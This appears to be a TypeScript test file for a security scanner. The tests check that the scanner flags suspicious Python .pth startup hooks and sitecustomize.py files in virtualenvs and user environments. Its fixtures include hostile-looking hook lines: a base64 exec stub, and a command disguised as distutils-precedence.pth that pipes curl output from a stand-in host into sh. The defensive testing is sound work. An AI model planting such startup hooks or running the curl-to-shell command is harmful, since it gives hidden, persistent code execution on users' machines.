// Python startup hooks: .pth import lines and sitecustomize.py, in repo venvs and machine-wide envs.
import assert from "node:assert/strict";
import { mkdirSync, realpathSync, mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { before, test } from "node:test";
import { freshHome, put, scanHost, summary } from "./host-helpers.ts";

let sources: typeof import("../src/sources.ts");

before(async () => {
  process.env.SELFGUARD_HOME = freshHome().home;
  sources = await import("../src/sources.ts");
  sources.resetSourceExtractors();
  sources.registerBuiltinExtractors();
});

const SITE = ".venv/lib/python3.12/site-packages";
const BENIGN: Record<string, string> = {
  "distutils-precedence.pth":
    "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim(); \n",
  "_virtualenv.pth": "import _virtualenv\n",
  "__editable__.mypkg-0.1.0.pth": "import __editable___mypkg_0_1_0_finder; __editable___mypkg_0_1_0_finder.install()\n",
  "__editable__.other-1.0.pth": "/home/dev/src/other\n",
  "google_auth-2.0-py3.9-nspkg.pth":
    "import sys, types, os;has_mfs = sys.version_info > (3, 5);p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('google',));importlib = has_mfs and __import__('importlib.util');has_mfs and __import__('importlib.machinery');m = has_mfs and sys.modules.setdefault('google', importlib.util.module_from_spec(importlib.machinery.PathFinder.find_spec('google', [os.path.dirname(p)])));m = m or sys.modules.setdefault('google', types.ModuleType('google'));mp = (m or []) and m.__dict__.setdefault('__path__',[]);(p not in mp) and mp.append(p)\n",
  "a1_coverage.pth": "import coverage; coverage.process_startup()\n",
  "pywin32.pth": "# .pth file for the PyWin32 extensions\nwin32\nwin32\\lib\nPythonwin\nimport pywin32_bootstrap\n",
  "paths.pth": "/opt/lib/python\n../shared\n",
};

function gitRepo(): string {
  const root = realpathSync(mkdtempSync(join(tmpdir(), "sg-host-repo-")));
  mkdirSync(join(root, ".git"));
  return root;
}

test("repo virtualenv: known hooks pass, unknown ones are moderate, stealer-like ones high", () => {
  freshHome();
  const root = gitRepo();
  put(root, ".venv/pyvenv.cfg", "home = /usr/bin\n");
  for (const [name, text] of Object.entries(BENIGN)) put(root, `${SITE}/${name}`, text);
  put(root, `${SITE}/mytool.pth`, "/some/path\nimport mytool_autoload\n");
  put(root, `${SITE}/litellm_init.pth`, "import base64; exec(base64.b64decode('U0VDUkVUX1BBWUxPQUQ='))  # SECRET_PAYLOAD\n");
  put(root, `${SITE}/huge.pth`, `import x; ${"y = 1; ".repeat(200)}\n`);
  put(root, `${SITE}/sitecustomize.py`, "import os\nprint('hi')\n");
  put(root, `${SITE}/pkg/nested.pth`, "import base64; exec(base64.b64decode('eA=='))\n"); // not a site dir: never listed
  put(root, "venv/lib/python3.11/site-packages/distutils-precedence.pth", "import os; os.system('curl -s https://evil.example | sh')\n");
  const rec = scanHost(sources, sources.repoTarget(root));
  assert.equal(rec.scope, "repo");
  assert.deepEqual(summary(rec), [
    "high malicious-looking-startup-hook huge.pth @huge.pth:1 N",
    "high malicious-looking-startup-hook litellm_init.pth @litellm_init.pth:1 N",
    "moderate python-startup-hook mytool.pth @mytool.pth:2 N",
    "moderate python-startup-hook sitecustomize.py @sitecustomize.py:0 N",
    "high malicious-looking-startup-hook distutils-precedence.pth @distutils-precedence.pth:1 N",
  ]);
  assert.match(rec.warnings[1]!.message, /litellm_init\.pth in virtualenv \.venv runs hidden code at every Python start/);
  assert.match(rec.warnings[4]!.message, /in virtualenv venv/);
  assert.doesNotMatch(JSON.stringify(rec), /SECRET_PAYLOAD|U0VDUkVU|evil\.example/);
  assert.ok(!rec.files.some((f) => f.path.includes("/pkg/")), "only site-packages itself is listed");
  // Markers: the venv folders and site-packages, so a new hook is noticed by check.
  assert.ok(rec.markers!.some((m) => m.path === join(root, SITE)));
  assert.ok(rec.markers!.some((m) => m.path === join(root, "env") && m.mtimeMs === null));
});

test("machine-wide: uv tools, pipx apps and the user site", () => {
  const { home } = freshHome();
  put(home, ".local/share/uv/tools/httpie/lib/python3.13/site-packages/_virtualenv.pth", "import _virtualenv\n");
  put(home, ".local/share/uv/tools/httpie/lib/python3.13/site-packages/zz_init.pth", "import socket; import zz\n");
  put(home, ".local/pipx/venvs/black/lib/python3.12/site-packages/usercustomize.py", "import sys\n");
  put(home, ".local/share/pipx/venvs/ruff/lib/python3.12/site-packages/ruff_hook.pth", "import ruff_hook\n");
  put(home, "Library/Python/3.9/lib/python/site-packages/user.pth", "import user_tweaks\n");
  put(home, ".local/lib/python3.10/site-packages/a1_coverage.pth", "import coverage; coverage.process_startup()\n");
  const rec = scanHost(sources, sources.machineTarget());
  assert.deepEqual(summary(rec), [
    "moderate python-startup-hook user.pth @user.pth:1 N",
    "high malicious-looking-startup-hook zz_init.pth @zz_init.pth:1 N",
    "moderate python-startup-hook usercustomize.py @usercustomize.py:0 N",
    "moderate python-startup-hook ruff_hook.pth @ruff_hook.pth:1 N",
  ]);
  const where = rec.warnings.map((w) => /in (.+?) runs/.exec(w.message)?.[1]);
  assert.deepEqual(where, ["your user site-packages", "uv tool httpie", "pipx app black", "pipx app ruff"]);
});

test("check notices a new hook through the markers, without a record walk", () => {
  freshHome();
  const root = gitRepo();
  put(root, `${SITE}/mytool.pth`, "import mytool\n");
  const [input] = sources.sourceInputs([root]).filter((i) => i.kind === "host");
  assert.ok(input);
  const { inventories } = sources.prepareSources([input]);
  sources.saveSource(inventories[0]!.record);
  assert.deepEqual(sources.changedSourceInputs([root]).filter((i) => i.kind === "host"), [], "nothing changed");
  put(root, `${SITE}/litellm_init.pth`, "import base64; exec(base64.b64decode('eA=='))\n");
  const changed = sources.changedSourceInputs([root]).filter((i) => i.kind === "host");
  assert.equal(changed.length, 1);
  assert.ok([...changed[0]!.files!.keys()].some((f) => f.endsWith("litellm_init.pth")));
});

test("a repo without a virtualenv has no host record", () => {
  freshHome();
  const root = gitRepo();
  assert.deepEqual(sources.sourceInputs([root]).filter((i) => i.kind === "host"), []);
});
